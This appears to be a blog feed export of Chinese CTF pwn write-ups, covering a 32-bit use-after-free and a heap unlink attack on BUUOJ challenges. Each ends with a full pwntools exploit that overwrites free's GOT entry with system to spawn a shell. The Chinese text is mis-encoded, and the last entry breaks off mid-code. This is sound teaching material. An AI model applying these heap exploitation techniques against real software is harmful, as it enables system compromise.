        <content type="html"><![CDATA[<h1 id="ciscn-2019-n-3-32ä½uaf"><a href="#ciscn-2019-n-3-32ä½uaf" class="headerlink" title="ciscn_2019_n_3(32ä½uaf)"></a>ciscn_2019_n_3(32ä½uaf)</h1><p><font size="4"><a class="link" href="https://buuoj.cn/challenges#ciscn_2019_n_3">é¢˜ç›®é“¾æ¥ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></font></p><h2 id="1-é¢˜ç›®åˆ†æ"><a href="#1-é¢˜ç›®åˆ†æ" class="headerlink" title="1.é¢˜ç›®åˆ†æ"></a>1.é¢˜ç›®åˆ†æ</h2><p><img lazyload src="/images/loading.svg" data-src="/../capture_20240902124827761.bmp" alt="capture_20240902124827761"></p><ul><li>åˆæ˜¯å…¸å‹çš„å †èœå•é¢˜ç›®ï¼Œä½†æ˜¯æ³¨æ„æ­¤é¢˜æ˜¯32ä½çš„ï¼Œæ¥ç€çœ‹å„ä¸ªåŠŸèƒ½å—ï¼š</li></ul><p><font size="4"><strong>do_new</strong></font></p><p><img lazyload src="/images/loading.svg" data-src="/../capture_20240902124929281.bmp" alt="capture_20240902124929281"></p><p><font size="4"><strong>do_del</strong></font></p><p><img lazyload src="/images/loading.svg" data-src="/../capture_20240902124936477.bmp" alt="capture_20240902124936477"></p><p><font size="4"><strong>do_dump</strong></font></p><p><img lazyload src="/images/loading.svg" data-src="/../capture_20240902124944351.bmp" alt="capture_20240902124944351"></p><p><font size="4"><strong>ask</strong></font></p><p><img lazyload src="/images/loading.svg" data-src="/../capture_20240902124950987.bmp" alt="capture_20240902124950987"></p><h3 id="1-1åŠŸèƒ½å—åˆ†æ"><a href="#1-1åŠŸèƒ½å—åˆ†æ" class="headerlink" title="1.1åŠŸèƒ½å—åˆ†æ"></a>1.1åŠŸèƒ½å—åˆ†æ</h3><ul><li>do_newé‡Œé¢æ˜¯ç”Ÿæˆä¸¤ä¸ªchunk(type&#x3D;2)ï¼Œæ³¨æ„å…¶ä¸­ç¬¬ä¸€ä¸ªchunkï¼Œmalloc(0xc)ï¼Œ<strong>å¯¹äº32ä½æ¥è¯´ï¼Œä»–æ˜¯0x8+0x4ï¼Œè¿™æ ·mallocçš„chunkæ¶‰åŠåˆ°äº†prev_sizeçš„å¤ç”¨</strong>ï¼Œä¸‹ä¸€ä¸ªchunkçš„prev_sizeå°†ä¼šå……å½“ä¸Šä¸€ä¸ªchunkçš„user_dataéƒ¨åˆ†ï¼Œå› ä¸ºprev_sizeè®°å½•ä¸Šä¸€ä¸ªchunkæ˜¯å¦è¢«åˆ©ç”¨ï¼Œæ²¡åˆ©ç”¨è®°ä½œ0ï¼Œç©ºç€ä¸ç”¨å¤ªæµªè´¹äº†å°±ä¼šè¢«åˆ©ç”¨ï¼Œ**å¯¹åº”äº64ä½ï¼Œmalloc(0xn0 + 0x8)**ã€‚</li><li>prev_sizeçš„å¤ç”¨é€šå¸¸ä¼šç”¨äºoff_by_oneæ¼æ´åˆ©ç”¨ï¼Œä½†è¿™é‡Œæ²¡æœ‰off_by_one</li><li>do_newä¸­çš„chunkç»“æ„å¦‚ä¸‹ï¼š</li></ul><p><img lazyload src="/images/loading.svg" data-src="/../heap.drawio.png" alt="heap.drawio"></p><p><font size="4" color="red">æ¼æ´ç‚¹å°±åœ¨rec_int_freeå’Œdo_delé‡Œé¢ï¼š</font></p><p><img lazyload src="/images/loading.svg" data-src="/../capture_20240902130932374.bmp" alt="capture_20240902130932374"></p><p><em><em>do_delä»¥åœ°å€æ‰§è¡Œå‡½æ•°ï¼Œ</em>(record[i]+4)å¯¹åº”çš„å°±æ˜¯rec_int_freeå‡½æ•°ï¼Œrecord[i]å°±æ˜¯æŒ‡é’ˆå‚æ•°ã€‚</em>*</p><ul><li>æ€è·¯åº”è¯¥å¾ˆæ¸…æ™°äº†,å’Œä¹‹å‰ä¸€æ ·çš„ï¼Œä¿®æ”¹free_got -&gt; system_pltï¼Œç„¶åå¾€record[i]ä¼ å…¥&#x2F;bin&#x2F;sh\x00ï¼Œè¿›è¡Œdo_del,å°±å¯ä»¥getshellï¼Œä½†æ˜¯æ­¤é¢˜æœ‰ç‚¹åŒºåˆ«ï¼Œ<strong>ç”±äºæ˜¯32ä½ï¼Œ&#x2F;bin&#x2F;sh\x00æœ‰8å­—èŠ‚ï¼Œä¸€ä¸ªæœºå™¨å­—é•¿æ— æ³•å†™ä¸‹ï¼Œå…¶å®è¿™é‡Œå†™å…¥sh\x00\x00ä¹Ÿå¯ä»¥getshellã€‚</strong></li><li>å¦‚ä½•ä¿®æ”¹ï¼Œè¿™é‡Œåˆ©ç”¨äº†<font color="red"><strong>uafã€‚</strong></font></li></ul><h2 id="2-gdbè°ƒè¯•"><a href="#2-gdbè°ƒè¯•" class="headerlink" title="2.gdbè°ƒè¯•"></a>2.gdbè°ƒè¯•</h2><h3 id="1"><a href="#1" class="headerlink" title="1."></a>1.</h3><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">add</span>(<span class="number">0</span>,<span class="number">2</span>,<span class="number">0x10</span>,b<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line"><span class="title function_">add</span>(<span class="number">1</span>,<span class="number">2</span>,<span class="number">0x10</span>,b<span class="string">&#x27;bbbb&#x27;</span>)</span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="/../capture_20240902131659259.bmp" alt="capture_20240902131659259"></p><ul><li><strong>æŸ¥çœ‹å †å¸ƒå±€å¯ä»¥æ˜æ˜¾çœ‹å‡ºprev_sizeçš„å¤ç”¨</strong></li></ul><h3 id="2"><a href="#2" class="headerlink" title="2."></a>2.</h3><ul><li>æ¥ç€æˆ‘ä»¬freeæ‰0ï¼Œ1ï¼Œé‚£ä¹ˆè¿™å››ä¸ªchunkéƒ½ä¼šè¢«freeæ‰ï¼Œè¿›å…¥fastbinsä¸­ï¼Œç„¶è€Œï¼Œfreeä¹‹åå®ƒä»¬çš„æŒ‡é’ˆå¹¶æœªæ¸…é›¶ï¼Œè¿™é‡Œå°±é€ æˆäº†uafæ¼æ´</li></ul><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># freeæŒ‡é’ˆä¸æ¸…é›¶,record[idx]ä¾ç„¶æœ‰æ•°å€¼</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># fastbins 0x10 1-&gt;0</span></span><br><span class="line">add(<span class="number">2</span>,<span class="number">2</span>,<span class="number">0xc</span>,<span class="string">b&#x27;sh\x00\x00&#x27;</span>+p32(system_plt))</span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="/../capture_20240902132413024.bmp" alt="capture_20240902132413024"></p><ul><li>æˆ‘ä»¬å†æ¬¡mallocï¼Œé¦–å…ˆå°±ä¼šmalloc(0xc)ï¼Œå°†record[1]malloc(0xc)ç»™æ‹¿èµ°ï¼Œæˆ‘ä»¬çš„ç›®çš„å°±æ˜¯ä¿®æ”¹recordå¤„çš„åœ°å€ï¼Œ<strong>é‚£ä¹ˆæˆ‘ä»¬å†æ¬¡malloc(0xc)ï¼Œç³»ç»Ÿä¼šå°†record[0]malloc(0xc)ç»™ä½ ï¼Œé‚£ä¹ˆæˆ‘ä»¬ä¿®æ”¹è¿™éƒ¨åˆ†çš„å†…å®¹äº†</strong></li></ul><p><img lazyload src="/images/loading.svg" data-src="/../capture_20240902132856868.bmp" alt="capture_20240902132856868"></p><ul><li><font size="4" color="red">ä¸‹å›¾å¯ä»¥å‘ç°record[0]å‘ç”Ÿäº†æ”¹å˜</font></li></ul><p><img lazyload src="/images/loading.svg" data-src="/../capture_20240902132909502.bmp" alt="capture_20240902132909502"></p><h3 id="3"><a href="#3" class="headerlink" title="3."></a>3.</h3><ul><li>æ­¤æ—¶æˆ‘ä»¬free(0)å°±å¯ä»¥getshelläº†</li></ul><h2 id="3-æœ€ç»ˆEXP"><a href="#3-æœ€ç»ˆEXP" class="headerlink" title="3.æœ€ç»ˆEXP"></a>3.æœ€ç»ˆEXP</h2><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#p = remote(&quot;node5.buuoj.cn&quot;,27447)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">free_got = elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">system_plt = elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choice</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx,<span class="built_in">type</span>,size,content</span>):</span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index &gt; &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Type &gt; &quot;</span>,<span class="built_in">str</span>(<span class="built_in">type</span>) )</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span> == <span class="number">2</span>:</span><br><span class="line">        p.sendlineafter(<span class="string">&quot;Length &gt; &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">        p.sendlineafter(<span class="string">&quot;Value &gt; &quot;</span>,content)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p.sendlineafter(<span class="string">&quot;Value &gt; &quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index &gt; &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index &gt; &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ€è·¯uaf,double_freeä¿®æ”¹free_got -&gt; system_plt</span></span><br><span class="line"><span class="comment"># æ³¨æ„32ä½</span></span><br><span class="line">add(<span class="number">0</span>,<span class="number">2</span>,<span class="number">0x10</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">2</span>,<span class="number">0x10</span>,<span class="string">b&#x27;bbbb&#x27;</span>)</span><br><span class="line">bug()</span><br><span class="line"></span><br><span class="line"><span class="comment"># freeæŒ‡é’ˆä¸æ¸…é›¶,record[idx]ä¾ç„¶æœ‰æ•°å€¼</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># fastbins 0x10 1-&gt;0</span></span><br><span class="line">add(<span class="number">2</span>,<span class="number">2</span>,<span class="number">0xc</span>,<span class="string">b&#x27;sh\x00\x00&#x27;</span>+p32(system_plt))</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      
        <tags>
            
            <tag> ctf-pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ZJCTF_2019_EasyHeap-unlink</title>
      <link href="/2024/09/01/ZJCTF-2019-EasyHeap-unlink/"/>
      <url>/2024/09/01/ZJCTF-2019-EasyHeap-unlink/</url>
      
        <content type="html"><![CDATA[<h1 id="ZJCTF-2019-EasyHeap-unlink"><a href="#ZJCTF-2019-EasyHeap-unlink" class="headerlink" title="[ZJCTF_2019]EasyHeap-unlink"></a>[ZJCTF_2019]EasyHeap-unlink</h1><p><a class="link" href="https://buuoj.cn/challenges#[ZJCTF%202019]EasyHeap">é¢˜ç›®é“¾æ¥ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><h2 id="åˆæ¬¡åˆ†æ"><a href="#åˆæ¬¡åˆ†æ" class="headerlink" title="åˆæ¬¡åˆ†æ"></a>åˆæ¬¡åˆ†æ</h2><ul><li>åˆšå¼€å§‹idaä¸€çœ‹ï¼Œä»¥ä¸ºå’Œä¹‹å‰çš„é¢˜ç›®ä¸€æ ·ï¼Œå°±æ˜¯ç®€å•çš„ä¿®æ”¹unsortedbin-&gt;bkï¼Œç„¶ågetflag</li><li>ä¹‹å‰çš„é¢˜ç›®è®²è§£ï¼š[BUUCTF hitcontraining_magicheapâ€“<a class="link" href="https://blog.csdn.net/zwb2603096342/article/details/140345550?spm=1001.2014.3001.5502">Unsorted_bin-ï¼bkä¿®æ”¹]3-CSDNåšå®¢ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li></ul><p><img lazyload src="/images/loading.svg" data-src="/../capture_20240901201439897.bmp"></p><ul><li><font size="4"><strong>l33ræ˜¯ä¸ªåé—¨å‡½æ•°</strong></font></li></ul><p><img lazyload src="/images/loading.svg" data-src="/../capture_20240901202058454.bmp"></p><ul><li>æ­£å¸¸æ‰“ç»“æœå´æ˜¾ç¤ºï¼š</li></ul><p><img lazyload src="/images/loading.svg" data-src="/../capture_20240901193853555.bmp"></p><ul><li><font size="4" color="red">æ‰€ä»¥è¢«åé—¨å‡½æ•°æ¬ºéª—äº†ï¼ï¼ï¼</font></li></ul><h2 id="æ­£å¼åˆ†æ"><a href="#æ­£å¼åˆ†æ" class="headerlink" title="æ­£å¼åˆ†æ"></a>æ­£å¼åˆ†æ</h2><p>å„ä¸ªåŠŸèƒ½å—å°±ä¸å±•ç¤ºäº†ï¼Œå¯ä»¥çœ‹å¼€å¤´çš„åšå®¢ã€‚</p><ul><li>ç»™äº†åé—¨å‡½æ•°ä¸å¯ä»¥ç”¨ï¼Œä½†æ˜¯æä¾›äº†systenå‡½æ•°ï¼Œæˆ‘ä»¬è¦åšçš„å°±æ˜¯å¾€é‡Œé¢ä¼ å‚ï¼Œä¸ä¸Šä¸€ç¯‡åšå®¢å¯ä»¥è¯´å¾ˆç›¸ä¼¼äº†ï¼Œ<font color="red">å…ˆä¼ å…¥&#x2F;bin&#x2F;sh,ä¿®æ”¹free_gotä¸ºsystem_plt,æ‰§è¡Œfreeå³å¯</font></li><li>é‚£ä¹ˆå¦‚ä½•ä¿®æ”¹free_gotï¼Œä¸ºäº†å®ç°è¿™ä¸ªåŠŸèƒ½ï¼Œæˆ‘ä»¬é€šå¸¸æœ‰double_freeæ§åˆ¶åŒä¸€ä¸ªchunkï¼Œä½†æ˜¯è¿™é‡Œfreeåå°†æŒ‡é’ˆæ¸…é›¶äº†ï¼Œæ‰€ä»¥æ— ç–‘æ˜¯ä¸å¯ä»¥çš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥é‡‡å–unlinkï¼Œå…³äºunlinkå¯ä»¥å‚è€ƒ<a class="link" href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/unlink/#unlink_2">è¿™ç¯‡æ–‡ç«  <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li><li>æ­¤é¢˜çš„PIEä¹Ÿæ²¡æœ‰å¼€ï¼Œä¸”å…·æœ‰heaparrayåœ°å€ï¼š</li></ul><p><img lazyload src="/images/loading.svg" data-src="/../capture_20240901202849993.bmp"></p><p><font size="4">å¸¸è§„çš„ï¼š</font></p><ul><li><font size="4"><strong>fd -&gt;  heaparray-0x18</strong></font></li><li><font size="4"><strong>bk -&gt; heaparray-0x10</strong></font></li></ul><p><font size="4">è¿˜æœ‰ä¿®æ”¹è°çš„fdï¼Œbkè·Ÿç€gdbè°ƒè¯•ç†è§£å§</font></p><h2 id="gdbè°ƒè¯•"><a href="#gdbè°ƒè¯•" class="headerlink" title="gdbè°ƒè¯•"></a>gdbè°ƒè¯•</h2><h3 id="1"><a href="#1" class="headerlink" title="1."></a>1.</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;aaaa&#x27;</span>) <span class="comment"># 0</span></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;bbbb&#x27;</span>) <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>) <span class="comment"># 2</span></span><br></pre></td></tr></table></figure></div><ul><li>å…ˆç”Ÿæˆ3ä¸ªchunkï¼Œchunk2é˜²æ­¢chunk1åœ¨freeçš„æ—¶å€™ä¸top_chunkåˆå¹¶ï¼Œå¹¶ä¸”ä¼ å…¥&#x2F;bin&#x2F;sh</li><li>æ­¤æ—¶çš„å †å¸ƒå±€å¦‚ä¸‹</li></ul><p><img lazyload src="/images/loading.svg" data-src="/../capture_20240901203630753.bmp"></p><h3 id="2"><a href="#2" class="headerlink" title="2."></a>2.</h3><ul><li>unlinkéœ€è¦æ„é€ fake_chunk,ç„¶åuaf</li><li><strong>åˆ©ç”¨chunk0æ„é€ ä¸€ä¸ªfake_chunk:</strong></li></ul><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># æ„é€ fake_chunk</span></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + p64(heaparray-<span class="number">0x18</span>)+p64(heaparray-<span class="number">0x10</span>)</span><br><span class="line">payload += p64(<span class="number">0x20</span>) + p64(<span class="number">0x90</span>) <span class="comment"># ä¼ªé€ chunk0ä¸ºfree_chunk</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">free(<span class="number">1</span>) <span class="comment"># 0,1åˆå¹¶</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div><ul><li>æ­¤æ—¶å †å¸ƒå±€å¦‚ä¸‹ï¼Œæ„é€ çš„fake_chunkå’Œchunk1åˆå¹¶,çº¢æ¡†éƒ¨åˆ†åœ°å€åº”è¯¥æ˜¯main_arena+0x58</li></ul><p><img lazyload src="/images/loading.svg" data-src="/../capture_20240901204855949.bmp"></p><ul><li><font size="4" color="red"><strong>æŸ¥çœ‹heaparray</strong></font></li></ul><p><img lazyload src="/images/loading.svg" data-src="/../capture_20240901205436677.bmp"></p><p><font size="4" color="red"><strong>å¯ä»¥å¾ˆæ˜æ˜¾çš„å‘ç°ï¼Œä¿®æ”¹chunk0ï¼Œå°±æ˜¯ä¿®æ”¹heaparray-0x18çš„å€¼ï¼ï¼</strong></font></p><h3 id="3"><a href="#3" class="headerlink" title="3."></a>3.</h3><ul><li>ä¸¤ä¸ªåœ°æ–¹éƒ½å¯ä»¥ä¿®æ”¹chunk0ï¼Œé‚£ä¹ˆå°±å¯ä»¥å…ˆå¡«å…¥free_got,ç„¶åä¿®æ”¹æˆsystem_pltï¼Œå†free(2)å³å¯ï¼š</li></ul><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(free_got)</span><br><span class="line">edit(<span class="number">0</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">8</span>,p64(system_plt))</span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div><ul><li><font size="4">ç¬¬ä¸€æ¬¡edit</font></li></ul><p><img lazyload src="/images/loading.svg" data-src="/../capture_20240901210431840.bmp"></p><ul><li><font size="4">ç¬¬äºŒæ¬¡edit,å‘ç°æˆåŠŸä¿®æ”¹äº†</font></li></ul><p><img lazyload src="/images/loading.svg" data-src="/../capture_20240901210501273.bmp"></p><p><font size="4" color>æ³¨æ„ï¼š</font></p><p>è¿™é‡Œæœ‰ç‚¹åƒéæ ˆä¸Šæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ä¸€æ ·äº†ï¼Œå…ˆå»ºç«‹A -&gt; B -&gt;Cçš„ç»“æ„ï¼Œç„¶åä¿®æ”¹Aå…¶å®æ˜¯ä¿®æ”¹C</p><h2 id="å®Œæ•´EXP"><a href="#å®Œæ•´EXP" class="headerlink" title="å®Œæ•´EXP"></a><strong>å®Œæ•´EXP</strong></h2><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#p = remote(&quot;node5.buuoj.cn&quot;,28478)</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choice</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Size of Heap : &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Content of heap:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,size,content</span>):</span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index :&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Size of Heap : &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Content of heap : &quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index :&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¿®æ”¹free_got -&gt; system_plt</span></span><br><span class="line">magic = <span class="number">0x6020C0</span> </span><br><span class="line">heaparray = <span class="number">0x6020E0</span></span><br><span class="line">free_got = elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">system_plt = elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;aaaa&#x27;</span>) <span class="comment"># 0</span></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;bbbb&#x27;</span>) <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>) <span class="comment"># 2</span></span><br><span class="line">bug()</span><br><span class="line"><span class="comment"># æ„é€ fake_chunk</span></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + p64(heaparray-<span class="number">0x18</span>)+p64(heaparray-<span class="number">0x10</span>)</span><br><span class="line">payload += p64(<span class="number">0x20</span>) + p64(<span class="number">0x90</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">free(<span class="number">1</span>) <span class="comment"># 0,1åˆå¹¶</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(free_got)</span><br><span class="line">edit(<span class="number">0</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">8</span>,p64(system_plt))</span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      
        <tags>
            
            <tag> ctf-pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwnableç³»åˆ—</title>
      <link href="/2024/09/01/pwnable%E7%B3%BB%E5%88%97/"/>
      <url>/2024/09/01/pwnable%E7%B3%BB%E5%88%97/</url>
      
        <content type="html"><![CDATA[<h1 id="pwnable-start-32ä½"><a href="#pwnable-start-32ä½" class="headerlink" title="pwnable-start(32ä½)"></a>pwnable-start(32ä½)</h1><p><a class="link" href="https://buuoj.cn/challenges#pwnable_start">é¢˜ç›®é“¾æ¥ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><h4 id="å‰è¨€ï¼š"><a href="#å‰è¨€ï¼š" class="headerlink" title="å‰è¨€ï¼š"></a>å‰è¨€ï¼š</h4><p><font color="red"><strong>æ ¹æ®æ±‡ç¼–çœ‹æ¼æ´</strong></font></p><ul><li>ç›´æ¥çœ‹idaåæ±‡ç¼–ï¼Œå‘ç°çœ‹ä¸æ‡‚ï¼š</li></ul><p><img lazyload src="/images/loading.svg" data-src="/../capture_20240901105731101.bmp"></p><ul><li>æœæ–­é€‰æ‹©çœ‹æ±‡ç¼–ï¼š</li></ul><p><img lazyload src="/images/loading.svg" data-src="/../capture_20240901105741003.bmp"></p><p><font size="4"><strong>æ ¹æ®æ±‡ç¼–æˆ‘ä»¬å¯ä»¥çŸ¥é“è¿™é‡Œæ‰§è¡Œäº†ä¸¤ä¸ªå‡½æ•°ï¼š</strong></font></p><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">write(<span class="number">1</span>,buf,<span class="number">0x14</span>)</span><br><span class="line">read(<span class="number">3</span>,buf,<span 